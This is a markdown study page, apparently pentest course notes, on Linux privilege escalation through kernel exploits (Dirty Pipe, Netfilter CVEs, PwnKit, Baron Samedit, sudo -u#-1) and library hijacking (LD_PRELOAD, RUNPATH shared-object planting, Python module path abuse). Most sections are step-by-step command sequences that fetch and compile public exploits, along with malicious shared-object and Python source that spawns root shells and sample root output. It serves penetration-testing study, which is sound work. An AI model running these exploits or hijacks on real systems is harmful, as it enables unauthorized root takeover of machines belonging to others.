---
tags: [attack, attack/privesc]
module: linux_privilege_escalation
last_updated: 2026-05-10
source_count: 8
---

# Linux Privilege Escalation — Kernel Exploits and Library Hijacking

Kernel-level exploits (DirtyPipe, Netfilter CVEs, Polkit/PwnKit, sudo heap overflow) and library hijacking techniques (LD_PRELOAD, shared object hijacking, Python library path abuse).

## Overview

When configuration-based paths are exhausted, kernel exploits and library hijacking offer reliable routes to root. Kernel exploits target vulnerabilities in the kernel itself — many require only downloading, compiling, and running a PoC. Library hijacking abuses the dynamic linker's library search order to substitute a malicious shared object. Both categories require careful consideration of stability — kernel exploits in particular can crash production systems.

## Key Concepts / Techniques

### Kernel Exploit Methodology

1. Identify the exact kernel version: `uname -a`
2. Identify the distribution and version: `cat /etc/os-release`
3. Search for public PoCs matching the version (ExploitDB, GitHub, vulners.com)
4. Download, compile, and test on a matching system if possible
5. Transfer to target; execute; clean up

```bash
# Identify kernel and OS
uname -a
cat /etc/os-release
cat /etc/lsb-release

# General compile pattern
gcc kernel_exploit.c -o kernel_exploit
chmod +x kernel_exploit
./kernel_exploit
```

**IMPORTANT:** Kernel exploits can cause system instability or crashes. Never run against a production system without explicit authorization and a solid understanding of the exploit's behavior.

---

### Dirty COW — CVE-2016-5195

Classic race condition in the `copy-on-write` implementation. Allows unprivileged users to write to read-only memory mappings. Affects kernels up to ~4.8. Well-documented but older; still relevant for legacy systems.

---

### Dirty Pipe — CVE-2022-0847

A vulnerability in the pipe subsystem allowing unprivileged writes to read-only files (including files owned by root). Affects kernels **5.8 through 5.17**. Android devices also affected. Mechanistically similar to Dirty COW.

**Two exploit variants:**
- `exploit-1`: Modifies `/etc/passwd` to set root's password to `piped`
- `exploit-2`: Hijacks a SUID binary to drop a root shell

```bash
# Check kernel version (must be 5.8-5.17)
uname -r

# Download and compile
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Exploit variant 1 — modifies /etc/passwd, sets root password to "piped"
./exploit-1
# Then: su root (password: piped)

# Exploit variant 2 — hijacks a SUID binary
# First find a SUID binary
find / -perm -4000 2>/dev/null

# Run with SUID binary as argument
./exploit-2 /usr/bin/sudo
# Drops a root shell
```

---

### Netfilter Vulnerabilities

Netfilter is the kernel packet filtering subsystem used by `iptables`/`arptables`. Multiple LPE CVEs have been found here. These are kernel memory corruption exploits and carry stability risks.

| CVE | Kernel Versions | Mechanism |
|---|---|---|
| CVE-2021-22555 | 2.6 – 5.11 | Heap out-of-bounds write in netfilter setsockopt |
| CVE-2022-25636 | 5.4 – 5.6.10 | Heap OOB write in `nf_dup_netdev.c` |
| CVE-2023-32233 | up to 6.3.1 | Use-After-Free in `nf_tables` anonymous sets |

**CVE-2021-22555:**

```bash
uname -r  # confirm 2.6 - 5.11

wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
# id
# uid=0(root) gid=0(root) groups=0(root)
```

**CVE-2022-25636:**

```bash
uname -r  # confirm 5.4 - 5.6.10

git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
# WARNING: Can corrupt the kernel — may require reboot
```

**CVE-2023-32233:**

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

---

### Polkit — CVE-2021-4034 (PwnKit)

`pkexec` (part of Polkit) has a memory corruption vulnerability present for over 10 years, discovered and fixed in early 2022. Affects virtually all Linux distributions that have Polkit installed. Extremely reliable — no specific kernel version required, just a vulnerable Polkit version.

**Affected polkit versions:** < 0.120 (approximately). Check your distro's patch date — fixed in January 2022.

```bash
# Check polkit version
pkexec --version

# Download and compile PoC
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# Execute — drops into root shell immediately
./poc
id
# uid=0(root) gid=0(root) groups=0(root)
```

No prerequisites beyond a vulnerable Polkit. Extremely reliable against unpatched systems.

---

### Sudo Heap Overflow — CVE-2021-3156 (Baron Samedit)

Heap-based buffer overflow in `sudoedit`/`sudo` introduced ~2011, fixed February 2021. Does not require any sudo permissions to trigger — any user on the system can exploit it.

**Affected sudo versions:**
- 1.8.31 — Ubuntu 20.04
- 1.8.27 — Debian 10
- 1.9.2 — Fedora 33

```bash
# Check sudo version
sudo -V | head -1

# Download and build the exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make

# List supported targets
./sudo-hax-me-a-sandwich

# Identify OS/sudo combo (from /etc/lsb-release)
cat /etc/lsb-release

# Run with target index (e.g., 1 for Ubuntu 20.04)
./sudo-hax-me-a-sandwich 1
# id
# uid=0(root) gid=0(root) groups=0(root)
```

### Sudo Policy Bypass — CVE-2019-14287

In sudo < 1.8.28, specifying UID `-1` maps to UID `0` (root), bypassing `!root` restrictions in sudoers:

```bash
# Requirement: user has sudo entry like:
# user ALL=(ALL) /usr/bin/id  (any command works)

# Check version
sudo -V | head -1  # must be < 1.8.28

# Exploit: -u #-1 maps to root
sudo -u #-1 id
# uid=0(root)

# Get a shell
sudo -u #-1 /bin/bash
```

---

### Shared Library Hijacking — LD_PRELOAD

When a user can run a command via `sudo` and the sudoers entry preserves `LD_PRELOAD` (`env_keep+=LD_PRELOAD`), a malicious shared library loaded before the program runs as root:

```bash
# Check for LD_PRELOAD in sudo -l output:
# Defaults env_keep+=LD_PRELOAD

# Compile the preload library
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles

# Execute any sudo-permitted command with the library preloaded
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
# Drops root shell before apache2 executes
```

### Shared Object Hijacking (RUNPATH)

SUID binaries or privileged programs that load shared libraries from a writable directory (embedded RUNPATH) can be hijacked by placing a malicious `.so` in that directory:

```bash
# Check a SUID binary's library dependencies
ldd /usr/local/bin/payroll

# Find the RUNPATH
readelf -d /usr/local/bin/payroll | grep PATH
# RUNPATH: [/development]

# Confirm /development is writable
ls -la /development/

# Determine what function the binary calls from the library
./payroll
# Error: undefined symbol: dbquery

# Compile a malicious library implementing that symbol
cat > /tmp/src.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
EOF
gcc /tmp/src.c -fPIC -shared -o /development/libshared.so

# Execute the SUID binary — loads malicious library first
./payroll   # root shell
```

Enumerate RUNPATH in all SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null | while read f; do
    readelf -d "$f" 2>/dev/null | grep -i runpath && echo "  ^ $f"
done
```

### Python Library Hijacking

Three attack vectors depending on the environment:

**1. Writable module file (SUID Python script):**

```bash
# Find a SUID Python script
ls -l mem_status.py
# -rwsrwxr-x 1 root mrb3n ...

# Find where the imported module's function is defined
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/

# Check write permissions on the module file
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# -rw-r--rw- 1 root staff ...  (world-writable!)

# Insert malicious code at the start of the function
# Add to the virtual_memory() function in __init__.py:
#   import os
#   os.system('id')

# Execute the SUID script
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root) gid=0(root) groups=0(root)
```

**2. Writable higher-priority path (Python search path hijacking):**

```bash
# Check Python's module search order
python3 -c 'import sys; print("\n".join(sys.path))'
# /usr/lib/python38.zip
# /usr/lib/python3.8          <-- higher priority
# ...
# /usr/local/lib/python3.8/dist-packages  <-- where psutil is installed

# Find the actual psutil install location
pip3 show psutil | grep Location

# Check if a higher-priority path is writable
ls -la /usr/lib/python3.8
# drwxr-xrwx  (world-writable!)

# Create a fake psutil.py in the writable, higher-priority directory
cat > /usr/lib/python3.8/psutil.py << 'EOF'
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
EOF

# Execute the script that imports psutil
sudo /usr/bin/python3 ./mem_status.py
# uid=0(root)
```

**3. PYTHONPATH environment variable (SETENV in sudoers):**

```bash
# Requirement: sudo entry with SETENV:
# (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

# Create fake module in /tmp/
cat > /tmp/psutil.py << 'EOF'
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
EOF

# Override PYTHONPATH so Python searches /tmp first
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
# uid=0(root)
```

## Commands / Syntax

```bash
# Kernel identification
uname -a
cat /etc/os-release
cat /etc/lsb-release

# Check sudo version for CVE-2021-3156
sudo -V | head -1

# Check polkit version
pkexec --version

# View shared library dependencies
ldd /path/to/binary

# Check RUNPATH
readelf -d /path/to/binary | grep -i runpath

# Python module search path
python3 -c 'import sys; print("\n".join(sys.path))'

# Find writable Python lib paths
ls -la /usr/lib/python3.*
```

## CVE Quick Reference

| CVE | Name | Affected Versions | Impact |
|---|---|---|---|
| CVE-2016-5195 | Dirty COW | Kernel < ~4.8 | Write to root-owned files |
| CVE-2022-0847 | Dirty Pipe | Kernel 5.8 – 5.17 | Write to any readable file |
| CVE-2021-22555 | Netfilter OOB | Kernel 2.6 – 5.11 | LPE via heap corruption |
| CVE-2022-25636 | Netfilter OOB | Kernel 5.4 – 5.6.10 | LPE via heap corruption |
| CVE-2023-32233 | nf_tables UAF | Kernel up to 6.3.1 | LPE via use-after-free |
| CVE-2021-4034 | PwnKit | Polkit < 0.120 | LPE without sudo rights |
| CVE-2021-3156 | Baron Samedit | sudo 1.8.2 – 1.9.5p1 | LPE, no sudo rights needed |
| CVE-2019-14287 | Sudo -u#-1 | sudo < 1.8.28 | Bypass `!root` restriction |

## Gotchas & Notes

- Kernel exploits may crash the system or leave it in an unstable state — always warn the client and test on a clone first if possible
- Dirty Pipe restores `/etc/passwd` after use in `exploit-1` — but verify the backup was created correctly
- CVE-2022-25636 (Netfilter 2022) explicitly requires a reboot to recover if it corrupts the kernel
- PwnKit (CVE-2021-4034) is extremely reliable; most unpatched systems prior to Feb 2022 are vulnerable
- Baron Samedit (CVE-2021-3156) requires `sudoedit` or `sudo` to accept a backslash-terminated argument — the PoC handles this
- LD_PRELOAD hijacking requires `env_keep+=LD_PRELOAD` — it is stripped by default in most modern sudo configurations
- Shared object hijacking is silent and leaves no obvious artifacts beyond the `.so` file
- Python hijacking via SETENV requires the sudoers to have `SETENV:` — not granted by default

## Related Pages

- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[attack/linux_privesc_sudo_suid]]
- [[attack/linux_privesc_services]]
- [[tools/enumeration/linpeas]]

## Sources

- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_kernel_exploits.md
- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_shared_libraries.md
- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_shared_object_hijacking.md
- raw/linux_privilege_escalation/linux_internals_based_privilege_escalation_python_library_hijacking.md
- raw/linux_privilege_escalation/recent_0days_dirty_pipe.md
- raw/linux_privilege_escalation/recent_0days_netfilter.md
- raw/linux_privilege_escalation/recent_0days_polkit.md
- raw/linux_privilege_escalation/recent_0days_sudo.md
